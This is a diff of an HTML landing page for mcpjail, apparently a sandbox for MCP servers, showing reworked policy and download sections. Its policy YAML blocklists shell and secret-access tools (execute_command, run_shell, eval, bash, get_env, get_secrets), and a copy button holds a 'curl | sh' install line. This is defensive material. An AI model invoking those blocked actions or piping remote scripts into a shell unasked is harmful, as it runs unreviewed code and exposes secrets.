+        <h2 class="section-title">Built-in Policies</h2>
       </div>
 
-      <div class="policy-selector">
-        <button class="policy-btn active" onclick="showPolicy('strict')">strict</button>
-        <button class="policy-btn" onclick="showPolicy('readonly')">readonly</button>
-        <button class="policy-btn" onclick="showPolicy('development')">development</button>
-        <button class="policy-btn" onclick="showPolicy('custom')">custom</button>
+      <div class="policies-grid">
+        <div class="policy-card">
+          <div class="policy-name">strict</div>
+          <div class="policy-desc">Maximum security. No network, read-only /tmp only, blocks all dangerous tools (execute_command, eval, shell, etc). Use for untrusted servers.</div>
+        </div>
+        <div class="policy-card">
+          <div class="policy-name">readonly</div>
+          <div class="policy-desc">Read-only access to mounted paths. Only allows read_file, list_directory, search_files, get_file_info tools.</div>
+        </div>
+        <div class="policy-card">
+          <div class="policy-name">development</div>
+          <div class="policy-desc">Balanced for local development. Write access to /workspace, localhost network allowed, extended timeout.</div>
+        </div>
+        <div class="policy-card">
+          <div class="policy-name">network-isolated</div>
+          <div class="policy-desc">Full filesystem access to mounted paths but completely network isolated. Good for offline processing.</div>
+        </div>
       </div>
 
-      <div class="policy-display">
-        <div class="policy-content" id="policy-strict">
-          <div class="policy-desc">Maximum security for untrusted servers. No network, minimal filesystem, blocks dangerous tools.</div>
-          <div class="code-block code-yaml">
-<pre>name: strict
-network:
-  mode: none
-filesystem:
-  mounts:
-    - path: /tmp
-      mode: rw
-      size: 100M
-tools:
-  mode: blocklist
-  blocked:
-    - execute_command
-    - run_shell
-    - eval, exec, bash, sh
-    - get_env, get_secrets
-resources:
-  memory: 256M
-  cpu: 0.5
-  timeout: 60s</pre>
-          </div>
-        </div>
+      <h3>Custom Policies</h3>
+      <p>Create YAML policy files for fine-grained control:</p>
 
-        <div class="policy-content hidden" id="policy-readonly">
-          <div class="policy-desc">Read-only access to mounted paths. Only allows file reading operations.</div>
-          <div class="code-block code-yaml">
-<pre>name: readonly
-network:
-  mode: none
-filesystem:
-  mounts:
-    - path: /workspace
-      mode: ro
-tools:
-  mode: allowlist
-  allowed:
-    - read_file
-    - list_directory
-    - search_files
-    - get_file_info</pre>
-          </div>
-        </div>
-
-        <div class="policy-content hidden" id="policy-development">
-          <div class="policy-desc">Balanced for local development. Write access, localhost network, extended limits.</div>
-          <div class="code-block code-yaml">
-<pre>name: development
-network:
-  mode: allowlist
-  allowed_hosts:
-    - localhost
-    - 127.0.0.1
-filesystem:
-  mounts:
-    - path: /workspace
-      mode: rw
-    - path: /tmp
-      mode: rw
-      size: 500M
-resources:
-  memory: 1G
-  cpu: 2.0
-  timeout: 600s</pre>
-          </div>
-        </div>
-
-        <div class="policy-content hidden" id="policy-custom">
-          <div class="policy-desc">Create your own policy file for fine-grained control:</div>
-          <div class="code-block code-yaml">
-<pre>name: my-policy
+      <div class="code-block code-yaml">
+<pre>name: custom
 version: 1
 
 network:
   mode: allowlist
   allowed_hosts:
     - api.example.com:443
-    - db.internal:5432
 
 filesystem:
   mode: explicit
   mounts:
+    - path: /workspace
+      mode: rw
     - path: /data
       mode: ro
-    - path: /output
-      mode: rw
 
 tools:
   mode: blocklist
   blocked:
     - execute_command
     - run_shell
+    - eval
 
 resources:
   memory: 512M
   cpu: 1.0
-  pids: 100
-  timeout: 300s
-
-audit:
-  enabled: true
-  level: info</pre>
-          </div>
-          <p class="policy-note">Save as <code>~/.mcpjail/policies/my-policy.yaml</code> and use with <code>--policy my-policy</code></p>
-        </div>
+  timeout: 300s</pre>
       </div>
     </div>
   </section>
@@ -740,48 +400,51 @@ audit:
         <h2 class="section-title">Downloads</h2>
       </div>
 
-      <div class="downloads-cards">
-        <a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-x86_64-apple-darwin.tar.gz" class="dl-card">
-          <div class="dl-icon">&#63743;</div>
-          <div class="dl-info">
-            <div class="dl-os">macOS Intel</div>
-            <div class="dl-arch">x86_64</div>
-          </div>
-        </a>
-        <a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-aarch64-apple-darwin.tar.gz" class="dl-card">
-          <div class="dl-icon">&#63743;</div>
-          <div class="dl-info">
-            <div class="dl-os">macOS Silicon</div>
-            <div class="dl-arch">ARM64</div>
-          </div>
-        </a>
-        <a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-x86_64-unknown-linux-gnu.tar.gz" class="dl-card">
-          <div class="dl-icon">&#128039;</div>
-          <div class="dl-info">
-            <div class="dl-os">Linux</div>
-            <div class="dl-arch">x86_64</div>
-          </div>
-        </a>
-        <a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-aarch64-unknown-linux-gnu.tar.gz" class="dl-card">
-          <div class="dl-icon">&#128039;</div>
-          <div class="dl-info">
-            <div class="dl-os">Linux ARM</div>
-            <div class="dl-arch">ARM64</div>
-          </div>
-        </a>
-        <a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-x86_64-pc-windows-msvc.zip" class="dl-card">
-          <div class="dl-icon">&#128187;</div>
-          <div class="dl-info">
-            <div class="dl-os">Windows</div>
-            <div class="dl-arch">x86_64 (WSL2)</div>
-          </div>
-        </a>
+      <p>Pre-built binaries for all major platforms. Or use the <a href="#install">install script</a>.</p>
+
+      <div class="downloads-table">
+        <table>
+          <thead>
+            <tr>
+              <th>Platform</th>
+              <th>Architecture</th>
+              <th>Download</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>macOS</td>
+              <td>Intel (x86_64)</td>
+              <td><a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-x86_64-apple-darwin.tar.gz">mcpjail-x86_64-apple-darwin.tar.gz</a></td>
+            </tr>
+            <tr>
+              <td>macOS</td>
+              <td>Apple Silicon (ARM64)</td>
+              <td><a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-aarch64-apple-darwin.tar.gz">mcpjail-aarch64-apple-darwin.tar.gz</a></td>
+            </tr>
+            <tr>
+              <td>Linux</td>
+              <td>x86_64</td>
+              <td><a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-x86_64-unknown-linux-gnu.tar.gz">mcpjail-x86_64-unknown-linux-gnu.tar.gz</a></td>
+            </tr>
+            <tr>
+              <td>Linux</td>
+              <td>ARM64</td>
+              <td><a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-aarch64-unknown-linux-gnu.tar.gz">mcpjail-aarch64-unknown-linux-gnu.tar.gz</a></td>
+            </tr>
+            <tr>
+              <td>Windows</td>
+              <td>x86_64 (WSL2)</td>
+              <td><a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-x86_64-pc-windows-msvc.zip">mcpjail-x86_64-pc-windows-msvc.zip</a></td>
+            </tr>
+          </tbody>
+        </table>
       </div>
 
       <p class="downloads-note">
-        <a href="https://github.com/iwallarm/mcpjail/releases">All releases</a> &#183;
+        <a href="https://github.com/iwallarm/mcpjail/releases">View all releases</a> &#183;
         <a href="https://github.com/iwallarm/mcpjail">Source code</a> &#183;
-        <a href="MCP_SECURITY_REPORT.pdf">Security report (PDF)</a>
+        <a href="MCP_SECURITY_REPORT.pdf">Security audit report (PDF)</a>
       </p>
     </div>
   </section>
@@ -807,69 +470,11 @@ audit:
   </footer>
 
   <script>
-    // Copy command
     function copyCmd() {
       navigator.clipboard.writeText('curl -fsSL https://mcpjail.com/install.sh | sh');
       const btn = document.querySelector('.copy-btn');
       btn.textContent = 'COPIED';
       setTimeout(() => btn.textContent = 'COPY', 2000);
-    }
-
-    // Architecture layer info
-    function showLayer(layer) {
-      document.querySelectorAll('.layer-panel').forEach(p => p.classList.remove('active'));
-      document.querySelectorAll('.arch-layer').forEach(l => l.classList.remove('selected'));
-
-      document.getElementById('panel-' + layer).classList.add('active');
-      document.querySelector('[data-layer="' + layer + '"]').classList.add('selected');
-      document.getElementById('layer-info').classList.add('visible');
-    }
-
-    // Accordion
-    function toggleAccordion(btn) {
-      const item = btn.parentElement;
-      const isOpen = item.classList.contains('open');
-
-      // Close all
-      document.querySelectorAll('.accordion-item').forEach(i => i.classList.remove('open'));
-
-      // Open clicked if it wasn't open
-      if (!isOpen) {
-        item.classList.add('open');
-      }
-    }
-
-    // Vulnerability details
-    function showVuln(id) {
-      document.querySelectorAll('.vuln-panel').forEach(p => p.classList.remove('active'));
-      document.querySelectorAll('.vuln-card-interactive').forEach(c => c.classList.remove('selected'));
-
-      document.getElementById('vuln-' + id).classList.add('active');
-      event.currentTarget.classList.add('selected');
-      document.getElementById('vuln-detail').classList.add('visible');
-    }
-
-    function closeVuln() {
-      document.getElementById('vuln-detail').classList.remove('visible');
-      document.querySelectorAll('.vuln-card-interactive').forEach(c => c.classList.remove('selected'));
-    }
-
-    // Install tabs
-    function showTab(tab) {
-      document.querySelectorAll('.tab-content').forEach(t => t.classList.add('hidden'));
-      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-
-      document.getElementById('tab-' + tab).classList.remove('hidden');
-      event.currentTarget.classList.add('active');
-    }
-
-    // Policy selector
-    function showPolicy(policy) {
-      document.querySelectorAll('.policy-content').forEach(p => p.classList.add('hidden'));
-      document.querySelectorAll('.policy-btn').forEach(b => b.classList.remove('active'));
-
-      document.getElementById('policy-' + policy).classList.remove('hidden');
-      event.currentTarget.classList.add('active');
     }
   </script>
 </body>
